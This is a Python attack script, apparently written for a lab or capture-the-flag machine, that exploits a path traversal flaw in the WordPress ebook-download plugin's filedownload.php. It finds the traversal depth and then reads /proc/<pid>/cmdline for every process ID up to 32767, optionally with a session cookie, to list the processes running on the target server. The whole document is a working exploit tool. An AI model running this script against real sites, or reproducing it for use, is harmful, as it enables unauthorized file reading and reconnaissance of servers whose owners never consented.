#When providing a URL, only supply up to and including the variable=. For example "http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl="

import requests
import sys
import re
import argparse

parser = argparse.ArgumentParser()
#description=
parser.add_argument('-u', '--url', default='http://127.0.0.1/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=', required=True)
args=parser.parse_args()

class bcolours:
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'	

max_depth = 7
base_url = args.url
default_process = "proc/1/cmdline"
target_depth = 0
target_content = ""
process_address = ""
target_address = ""

for depth in range(max_depth):
	process_address = base_url + ("xx/" * depth) + default_process
	process_response = requests.get(process_address)
	process_content = str(process_response.content,'utf-8')
	process_status = str(process_response.status_code)
	if process_status == str(200):
		target_depth = depth
		target_content = process_content
		target_address = args.url+("xx/" * depth)+"proc/(x)/cmdline"
		break

print(bcolours.WARNING + "[*]" + bcolours.ENDC + " ProFI Explorer (v0.1b)")
print(bcolours.WARNING + "[*]" + bcolours.ENDC + " Owner: Stemack" + "\n")

print(bcolours.WARNING + "[!]" + bcolours.ENDC + " In order for this script to work against a closed website, a session COOKIE is required.")


cookie_request = input(bcolours.WARNING + "[?]" + bcolours.ENDC + " Do you wish to provide a session COOKIE? (y/N) ")
if cookie_request == "y":
	cookie_name = input(bcolours.WARNING + "[?]" + bcolours.ENDC + " Please enter your session COOKIE name: ")
	cookie_value = input(bcolours.WARNING + "[?]" + bcolours.ENDC + " Please enter your session COOKIE value: ")
	#cookie_jar = requests.cookies.RequestsCookieJar()
	#cookie_jar.set(cookie_name, cookie_value)
	cookies = dict(name=cookie_name, password=cookie_value)
	#print(cookie_jar)
	print(cookies)
	print(bcolours.WARNING + "[*]" + bcolours.ENDC + " Currently Scanning: " + target_address + "\n")
	for x in range(0,32767):
		request_address = args.url+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
		#print(request_address)
		#request_response = requests.get(request_address, cookies=cookie_jar)
		request_response = requests.get(request_address, cookies=cookies)
		request_content = str(request_response.content,'utf-8')
		string1 = "python"
		string2 = "/var"
		string3 = "/usr"
		string4 = "/sbin"
		if string1 in request_content or string2 in request_content or string3 in request_content or string4 in request_content:
			print(bcolours.GREEN + "[+]" + bcolours.ENDC + " FOUND: " + bcolours.WARNING + str(x) + bcolours.ENDC + " " + request_content.strip("\n"))
else:
	print(bcolours.WARNING + "[*]" + bcolours.ENDC + " Currently Scanning: " + target_address + "\n")
	for x in range(0,32767):
		request_address = args.url+("xx/" * depth)+"proc/"+str(x)+"/cmdline"
		#print(request_address)
		request_response = requests.get(request_address)
		request_content = str(request_response.content,'utf-8')
		string1 = "python"
		string2 = "/var"
		string3 = "/usr"
		string4 = "/sbin"
		if string1 in request_content or string2 in request_content or string3 in request_content or string4 in request_content:
			print(bcolours.GREEN + "[+]" + bcolours.ENDC + " FOUND: " + bcolours.WARNING + str(x) + bcolours.ENDC + " " + request_content.strip("\n"))
